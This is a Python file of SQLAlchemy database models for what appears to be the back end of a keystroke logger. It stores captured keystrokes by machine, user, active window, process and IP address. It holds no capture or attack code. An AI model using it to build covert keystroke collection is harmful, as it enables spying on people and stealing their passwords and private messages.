import time

from sqlalchemy import ForeignKey, UniqueConstraint, CheckConstraint, Integer, String, Text, Index
from sqlalchemy.orm import Mapped, mapped_column

from database.db import Base



class Machine(Base):
    __tablename__ = "machines"

    id: Mapped[int] = mapped_column(Integer, primary_key=True, nullable=False, autoincrement=True)
    guid: Mapped[str] = mapped_column(String, nullable=False)
    created_at: Mapped[int] = mapped_column(Integer, default=lambda: (int(time.time())//60)*60)
    last_seen: Mapped[int] = mapped_column(Integer, default=lambda: (int(time.time())//60)*60)

    __table_args__ = (
        Index("idx_machine_guid", "guid"),
        CheckConstraint("length(guid) >= 1", name="valid_guid")
    )

class User(Base):
    __tablename__ = "users"

    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True, nullable=False)
    username: Mapped[str] = mapped_column(String, nullable=False)
    machine_id: Mapped[int] = mapped_column(ForeignKey(column="machines.id",
                                                       ondelete="CASCADE"),
                                            nullable=False)
    created_at: Mapped[int] = mapped_column(Integer, default=lambda: (int(time.time())//60)*60)
    last_seen: Mapped[int] = mapped_column(Integer, default=lambda: (int(time.time())//60)*60)

    __table_args__ = (
        Index("idx_username", "username"),
        UniqueConstraint("username", "machine_id"),
        CheckConstraint('length(username) >= 1 AND length(username) <= 20')
    )

class IpAddress(Base):
    __tablename__ = "ip_addresses"

    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True, nullable=False)
    ipv4: Mapped[str] = mapped_column(String, nullable=False)
    __table_args__ = (
        Index("idx_ipv4", "ipv4"),
        CheckConstraint("ipv4 like '%.%.%.%'", name="valid_ipv4")
    )


class Window(Base):
    __tablename__ = "windows"

    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True, nullable=False)

    name: Mapped[str] = mapped_column(Text, nullable=False)
    class_name: Mapped[str] = mapped_column("class", String(256), nullable=False)
    process_name: Mapped[str] = mapped_column("process" ,Text, nullable=False)

    __table_args__ = (
        UniqueConstraint("name", "process", "class"),
        CheckConstraint("length(name) <= 32767"),
        CheckConstraint("length(class) >=1 AND length(class)<=256"),
        CheckConstraint("length(process) >= 1 AND length(process) <= 32767")
    )

class Log(Base):
    __tablename__ = "logs"

    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True, nullable=False)
    keystrokes: Mapped[str] = mapped_column(Text, nullable=False, default="")
    timestamp: Mapped[int] = mapped_column(Integer, nullable=False, default=lambda: (int(time.time())//60)*60)

    user_id: Mapped[int] = mapped_column(ForeignKey("users.id", ondelete="CASCADE"),
                                         nullable=False)
    machine_id: Mapped[int] = mapped_column(ForeignKey("machines.id", ondelete="CASCADE"),
                                            nullable=False)
    window_id: Mapped[int] = mapped_column(ForeignKey("windows.id", ondelete="CASCADE"),
                                           nullable=False)
    ip_id: Mapped[int] = mapped_column(ForeignKey("ip_addresses.id", ondelete="SET NULL"),
                                           nullable=True)
    __table_args__ = (
        Index("idx_user_time", "user_id", "timestamp"),
        UniqueConstraint("timestamp", "machine_id", "user_id", "window_id")
    )

class MachineIp(Base):
    __tablename__ = "machines_ips"

    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True, nullable=False)

    machine_id: Mapped[int] = mapped_column(ForeignKey("machines.id", ondelete="CASCADE"),
                                            nullable=False)
    ip_id: Mapped[int] = mapped_column(ForeignKey("ip_addresses.id", ondelete="CASCADE"),
                                       nullable=False)

    __table_args__ = (
        UniqueConstraint("machine_id", "ip_id"),
    )